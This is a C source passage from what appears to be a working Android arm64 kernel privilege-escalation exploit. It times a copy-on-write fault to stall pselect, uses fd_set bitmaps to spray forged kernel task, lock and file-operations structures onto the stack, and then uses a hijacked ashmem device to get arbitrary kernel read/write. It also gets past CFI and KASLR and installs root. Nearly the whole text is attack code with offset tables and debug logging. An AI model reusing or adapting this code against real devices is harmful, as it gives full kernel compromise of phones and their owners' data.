 * write, so it takes a COW fault.
 *
 * A helper thread holds mm->mmap_sem while mprotect() walks a large set of
 * prefaulted read-only PTEs. The mapping remains a single VMA: unlike the
 * first VMA-forest prototype, this does not churn mm->map_count (which can
 * alias an unreclaimed mm_struct in a missed slab reclaim). The COW fault
 * sleeps while core_sys_select's deep frame is live, so schedule frames grow
 * below the reclaimed waiter. */

extern long readiness_pselect_asm(int nfds, fd_set *readfds,
                                  fd_set *writefds, fd_set *exceptfds);

#define READINESS_PTE_MB_DEFAULT 2048
#define READINESS_PTE_MB_MAX 16384
#define READINESS_LOCK_HEADSTART_USEC 100

struct readiness_cow_ctx {
  void *region;
  size_t region_len;
  atomic_int start;
  atomic_int entered;
  atomic_int done;
  int ret;
  int err;
  long long elapsed_us;
};

static long long readiness_now_us(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (long long)ts.tv_sec * 1000000LL + ts.tv_nsec / 1000;
}

static size_t readiness_pte_mb(void) {
  const char *value = getenv("READINESS_PTE_MB");
  if (!value || !*value)
    return READINESS_PTE_MB_DEFAULT;

  char *end = NULL;
  errno = 0;
  unsigned long mb = strtoul(value, &end, 0);
  if (errno || end == value || *end || mb < 64 || mb > READINESS_PTE_MB_MAX)
    return READINESS_PTE_MB_DEFAULT;
  return (size_t)mb;
}

static int readiness_prepare_pte_region(struct readiness_cow_ctx *ctx) {
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  ctx->region_len = readiness_pte_mb() * 1024UL * 1024UL;
  ctx->region = mmap(NULL, ctx->region_len, PROT_READ,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
  if (ctx->region == MAP_FAILED) {
    ctx->region = NULL;
    return 0;
  }
#ifdef MADV_NOHUGEPAGE
  (void)madvise(ctx->region, ctx->region_len, MADV_NOHUGEPAGE);
#endif

  /* Read faults map the shared zero page: this installs ordinary PTEs and
   * page tables without allocating region_len bytes of physical memory. */
  unsigned long prefault = 0;
  for (size_t off = 0; off < ctx->region_len; off += page_size)
    prefault += *(volatile unsigned char *)((char *)ctx->region + off);
  __asm__ volatile("" : : "r"(prefault) : "memory");
  return 1;
}

static void *readiness_mmap_lock_thread(void *arg) {
  struct readiness_cow_ctx *ctx = arg;
  disable_rseq_for_thread();
  pin_to_core_ex(CORE > 0 ? CORE - 1 : CORE,
                 atomic_load(&route_waiter_core));

  while (!atomic_load_explicit(&ctx->start, memory_order_acquire))
    __asm__ volatile("yield" ::: "memory");

  atomic_store_explicit(&ctx->entered, 1, memory_order_release);
  long long start_us = readiness_now_us();
  errno = 0;
  ctx->ret = mprotect(ctx->region, ctx->region_len, PROT_NONE);
  ctx->err = errno;
  ctx->elapsed_us = readiness_now_us() - start_us;
  atomic_store_explicit(&ctx->done, 1, memory_order_release);
  return NULL;
}

static fd_set *readiness_map_cow_fdset(const fd_set *source, int *fd_out,
                                       size_t *map_len_out) {
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  int fd = (int)syscall(SYS_memfd_create, "readiness-fdset", MFD_CLOEXEC);
  if (fd < 0)
    return NULL;
  if (ftruncate(fd, (off_t)page_size) != 0 ||
      pwrite(fd, source, sizeof(*source), 0) != (ssize_t)sizeof(*source)) {
    close(fd);
    return NULL;
  }

  fd_set *mapping = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE, fd, 0);
  if (mapping == MAP_FAILED) {
    close(fd);
    return NULL;
  }

  /* Install a readable file PTE without taking the private write fault. */
  volatile unsigned long prefault = *(volatile unsigned long *)mapping;
  __asm__ volatile("" : : "r"(prefault) : "memory");

  *fd_out = fd;
  *map_len_out = page_size;
  return mapping;
}

struct readiness_block_monitor {
  int tid;
  int seq;
  atomic_int ready;
  atomic_int armed;
  atomic_int stop;
  atomic_int saw_block;
  int open_errno;
  long sched_ret;
  int sched_errno;
};

static char readiness_task_state(int fd) {
  char buf[256];
  ssize_t len = pread(fd, buf, sizeof(buf) - 1, 0);
  if (len <= 0)
    return 0;
  buf[len] = '\0';
  char *rparen = strrchr(buf, ')');
  if (!rparen || rparen[1] != ' ' || !rparen[2])
    return 0;
  return rparen[2];
}

static void *readiness_block_monitor_thread(void *arg) {
  struct readiness_block_monitor *monitor = arg;
  disable_rseq_for_thread();

  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", monitor->tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    monitor->open_errno = errno;
    atomic_store_explicit(&monitor->ready, 1, memory_order_release);
    return NULL;
  }
  atomic_store_explicit(&monitor->ready, 1, memory_order_release);

  while (!atomic_load_explicit(&monitor->stop, memory_order_acquire)) {
    if (!atomic_load_explicit(&monitor->armed, memory_order_acquire)) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    if (readiness_task_state(fd) == 'D') {
      atomic_store_explicit(&monitor->saw_block, 1, memory_order_release);
      atomic_fetch_add(&consumer_calls, 1);
      int nice = monitor->seq * 7;
      if (nice > 19)
        nice = 19;
      long long start_us = readiness_now_us();
      errno = 0;
      monitor->sched_ret = sched_setattr_tid(monitor->tid, nice);
      monitor->sched_errno = errno;
      long long walk_us = readiness_now_us() - start_us;
      if (walk_us < 0)
        walk_us = 0;
      if (walk_us > 1000000)
        walk_us = 1000000;
      atomic_store(&consumer_walk_us, (int)walk_us);
      if (monitor->sched_ret == 0)
        atomic_fetch_add(&consumer_success, 1);
      break;
    }
  }

  close(fd);
  return NULL;
}

void do_readiness_pause_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("readiness-pause route missing page=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        break;
      }
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    /* The COW monitor performs the one sched_setattr itself. Stop the
     * generic spinning consumer so it cannot steal the waiter's CPU. */
    atomic_store(&punch_consume_stop, 1);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_go, 0);

    /* PSELECT6 GEOMETRY (stack_fds = SP0-0x210):
     * The asm stub uses pselect6 (arm64 has no __NR_select).
     * __arm64_sys_pselect6(0x10) + __do_sys_pselect6(0x90) = 0xA0
     * before core_sys_select(0x1C0), so stack_fds = SP0-0x210.
     *
     *  tree_entry.pc    SP0-0x198 = res_readfds  word 0 -> MUST be 0
     *  tree_entry.right SP0-0x190 = res_readfds  word 1 -> MUST be 0
     *  tree_entry.left  SP0-0x188 = res_readfds  word 2 -> MUST be 0
     *  pi_tree.pc       SP0-0x180 = res_readfds  word 3 -> MUST be 0
     *  pi_tree.right    SP0-0x178 = res_readfds  word 4 -> MUST be 0
     *  pi_tree.left     SP0-0x170 = res_writefds word 0 -> MUST be 0
     *  task             SP0-0x168 = res_writefds word 1 -> SPRAY (fds 64-127 WRITE)
     *  lock             SP0-0x160 = res_writefds word 2 -> SPRAY (fds 128-191 WRITE)
     *  prio             SP0-0x158 = res_writefds word 3 -> SPRAY (fds 192-255 WRITE)
     *
     * Don't watch ANY fds for reading (tree/pi_tree = res_readfds = 0).
     * Watch fds 64-255 for writing (write-ready pipes for task/lock/prio).
     * Don't watch fds 0-63 for writing (pi_tree.left = res_writefds word 0 = 0).
     */
    fd_set in, out, ex;
    FD_ZERO(&in);
    FD_ZERO(&out);
    FD_ZERO(&ex);

    /* WRITE-readiness spray: in_writefds word 1 = fake_task bits (fds 64-127),
     * word 2 = fake_lock bits (fds 128-191), word 3 = prio bits (fds 192-255).
     * The pipe WRITE-ends at those positions are writable (POLLOUT). */
    fdset_put_word(&out, 1, (uint64_t)fake_task);
    fdset_put_word(&out, 2, (uint64_t)fake_lock);
    fdset_put_word(&out, 3, (uint64_t)(page_base + LOCK_OFF + 0x100));

    {
      char m[128];
      int n = snprintf(m, sizeof(m),
          "[OVERLAY] readiness-cow attempt=%d lock=%016zx task=%016zx psel-geom\n",
          route_attempt, fake_lock, fake_task);
      syscall(SYS_write, 2, m, n);
    }

    /* DEBUG: verify the pipe craft before putting the bitmap in a COW map. */
    {
      fd_set test_out;
      memcpy(&test_out, &out, sizeof(test_out));
      struct timeval tv = {0, 0};
      int test_ret = select(PSELECT_ROUTE_NFDS, NULL, &test_out, NULL, &tv);
      uint64_t w1 = 0, w2 = 0, w3 = 0;
      memcpy(&w1, (char *)&test_out + 1*8, 8);
      memcpy(&w2, (char *)&test_out + 2*8, 8);
      memcpy(&w3, (char *)&test_out + 3*8, 8);
      char dm[256];
      int dn = snprintf(dm, sizeof(dm),
          "[SPRAY-DBG] test select ret=%d w1=%016llx w2=%016llx w3=%016llx\n"
          "            want task=%016llx lock=%016llx\n",
          test_ret, (unsigned long long)w1, (unsigned long long)w2,
          (unsigned long long)w3,
          (unsigned long long)fake_task, (unsigned long long)fake_lock);
      syscall(SYS_write, 2, dm, dn);
    }

    int cow_fd = -1;
    size_t cow_len = 0;
    fd_set *cow_out = readiness_map_cow_fdset(&out, &cow_fd, &cow_len);
    struct readiness_cow_ctx cow_ctx = {0};
    atomic_init(&cow_ctx.start, 0);
    atomic_init(&cow_ctx.entered, 0);
    atomic_init(&cow_ctx.done, 0);
    if (!cow_out || !readiness_prepare_pte_region(&cow_ctx)) {
      cfi_last_step = 35;
      cfi_last_errno = errno;
      if (cow_out)
        munmap(cow_out, cow_len);
      if (cow_fd >= 0)
        close(cow_fd);
      pr_error("readiness COW setup failed errno=%d\n", cfi_last_errno);
      break;
    }

    struct readiness_block_monitor monitor = {
      .tid = atomic_load(&waiter_tid),
      .seq = route_attempt,
    };
    atomic_init(&monitor.ready, 0);
    atomic_init(&monitor.armed, 0);
    atomic_init(&monitor.stop, 0);
    atomic_init(&monitor.saw_block, 0);

    pthread_t mmap_locker;
    pthread_t block_monitor;
    int monitor_started = 0;
    int thread_err = pthread_create(&block_monitor, NULL,
                                    readiness_block_monitor_thread, &monitor);
    if (thread_err == 0) {
      monitor_started = 1;
      while (!atomic_load_explicit(&monitor.ready, memory_order_acquire))
        __asm__ volatile("yield" ::: "memory");
      if (monitor.open_errno)
        thread_err = monitor.open_errno;
    }
    if (thread_err == 0)
      thread_err = pthread_create(&mmap_locker, NULL,
                                  readiness_mmap_lock_thread, &cow_ctx);
    if (thread_err != 0) {
      cfi_last_step = 36;
      cfi_last_errno = thread_err;
      atomic_store(&monitor.stop, 1);
      if (monitor_started)
        pthread_join(block_monitor, NULL);
      munmap(cow_ctx.region, cow_ctx.region_len);
      munmap(cow_out, cow_len);
      close(cow_fd);
      pr_error("readiness blocker thread failed errno=%d\n", thread_err);
      break;
    }

    atomic_store_explicit(&cow_ctx.start, 1, memory_order_release);
    while (!atomic_load_explicit(&cow_ctx.entered, memory_order_acquire))
      __asm__ volatile("yield" ::: "memory");
    long long headstart_until =
        readiness_now_us() + READINESS_LOCK_HEADSTART_USEC;
    while (readiness_now_us() < headstart_until)
      __asm__ volatile("yield" ::: "memory");

    /* The monitor calls sched_setattr only after /proc reports the waiter
     * in TASK_UNINTERRUPTIBLE, which can only be the blocked COW fault in
     * this ready-pselect path. */
    atomic_store_explicit(&monitor.armed, 1, memory_order_release);
    long long pselect_start_us = readiness_now_us();
    long ret = readiness_pselect_asm(
        PSELECT_ROUTE_NFDS, NULL, cow_out, NULL);
    atomic_store(&punch_consume_go, 0);
    atomic_store_explicit(&monitor.stop, 1, memory_order_release);
    long long pselect_us = readiness_now_us() - pselect_start_us;

    pthread_join(mmap_locker, NULL);
    pthread_join(block_monitor, NULL);

    uint64_t cow_w1 = 0, cow_w2 = 0, cow_w3 = 0;
    memcpy(&cow_w1, (char *)cow_out + 1 * 8, 8);
    memcpy(&cow_w2, (char *)cow_out + 2 * 8, 8);
    memcpy(&cow_w3, (char *)cow_out + 3 * 8, 8);
    uint64_t want_w3 = (uint64_t)(page_base + LOCK_OFF + 0x100);
    /* The walk's [7] writes waiter->prio in place, so a successful walk
     * deliberately changes the low 32 bits of result word 3 (observed as
     * 0x78). Word 3 was already verified by the preflight select; after the
     * walk only task and lock must remain exact. */
    int overlay_ok = cow_w1 == (uint64_t)fake_task &&
                     cow_w2 == (uint64_t)fake_lock;

    munmap(cow_ctx.region, cow_ctx.region_len);
    munmap(cow_out, cow_len);
    close(cow_fd);
    route_pi_sanitize();

    {
      char m[384];
      int n = snprintf(m, sizeof(m),
          "[OVERLAY] readiness-cow ret=%ld pselect_us=%lld "
          "mprotect=%d/%d lock_us=%lld blocked=%d sched=%ld/%d overlay=%d "
          "w1=%016llx w2=%016llx w3=%016llx want3=%016llx\n",
          ret, pselect_us, cow_ctx.ret, cow_ctx.err, cow_ctx.elapsed_us,
          atomic_load(&monitor.saw_block), monitor.sched_ret,
          monitor.sched_errno, overlay_ok,
          (unsigned long long)cow_w1,
          (unsigned long long)cow_w2, (unsigned long long)cow_w3,
          (unsigned long long)want_w3);
      syscall(SYS_write, 2, m, n);
    }

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("readiness-cow walk attempt=%d/%d calls=%d success=%d walk_us=%d\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success,
            atomic_load(&consumer_walk_us));
    route_payload_canary();

    int route_signal = atomic_load(&monitor.saw_block) && overlay_ok &&
                       calls > 0 && success > 0;
    if (route_signal) {
      /* The readiness bitmap is no longer needed after the walk. Shrink the
       * shell uid's pipe-page charge before allocating the much larger
       * physrw reclaim population. */
      route_craft_close_all();
      int probe_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
      pr_info("fops probe: open fd=%d errno=%d\n", probe_fd, errno);
      if (probe_fd >= 0)
        close(probe_fd);

      if (skip_cfi_stage) {
        route_verified = 1;
        cfi_last_step = 0;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else {
      cfi_last_step = 33;
      cfi_last_errno = 0;
    }

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("readiness-cow cfi miss attempt=%d/%d step=%d errno=%d\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("readiness-cow route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

#else /* !ROUTE_READINESS_SPRAY */

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (skip_cfi_stage) {
        route_verified = 1;
        cfi_last_step = 0;
        pr_info("skip_cfi_stage: accepting route as verified\n");
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

#endif /* ROUTE_READINESS_SPRAY */

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK_CFI);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr =
      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int restore_slide_boot_id_pipe(int fd) {
  /* The tracefs slide path does not dirty these globals, but restoring the
   * expected values is harmless. Use canonical configfs access while the
   * forged fops is still installed; the old P0 aliases used guessed physical
   * translations and wrote unrelated RAM. */
  uintptr_t boot_id_data_ptr =
      canon_addr(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE);
  slide_bootid_want = canon_addr(SLIDE_SYSCTL_BOOTID_IMAGE);
  configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_before,
                     sizeof(slide_bootid_before));
  slide_bootid_restore_ret = configfs_write_once(
      fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_after,
                     sizeof(slide_bootid_after));
  pr_info("slide restore boot_id canonical pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type =
      canon_addr(SLIDE_NFULNL_LOGGER_OBJECT_IMAGE) + sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_ret = configfs_write_once(
      fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent canonical pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx\n",
          getpid(), type_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after);
  return boot_id_restored &&
         type_ret == (ssize_t)sizeof(type_want) && type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  pr_info("cfi starting pipe physrw\n");

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    pr_info("pipe physrw attempt=%d/%d\n", attempt + 1,
            PIPE_MAX_ATTEMPTS);
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    pr_warning("pipe physrw attempt=%d/%d failed\n", attempt + 1,
               PIPE_MAX_ATTEMPTS);
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
  if (!restore_slide_boot_id_pipe(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  uintptr_t misc_fops_canon = canon_addr(ASHMEM_MISC_FOPS);
  pr_info("cfi restoring misc_fops canonical target=%016zx value=%016llx\n",
          misc_fops_canon, (unsigned long long)original_fops);
  cfi_restore_ret = configfs_write_once(
      fd, misc_fops_canon, &original_fops, sizeof(original_fops));
  if (cfi_restore_ret != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }
  fops_after = original_fops;

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    if (pipebuf_page_base && pipebuf_pipe_idx >= 0) {
      uintptr_t misc_fops_canon = canon_addr(ASHMEM_MISC_FOPS);
      cfi_restore_ret = configfs_write_once(
          fd, misc_fops_canon, &original_fops_fail,
          sizeof(original_fops_fail));
      if (cfi_restore_ret == (ssize_t)sizeof(original_fops_fail))
        fops_after = original_fops_fail;
    } else {
      /* HARDENED_USERCOPY rejects configfs writes into kernel .data and
       * panic_on_oops makes that fatal. Until pipe physrw exists, leave the
       * swapped global pointer in place. The caller keeps the backing page
       * alive until the required reboot. */
      cfi_restore_ret = -1;
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
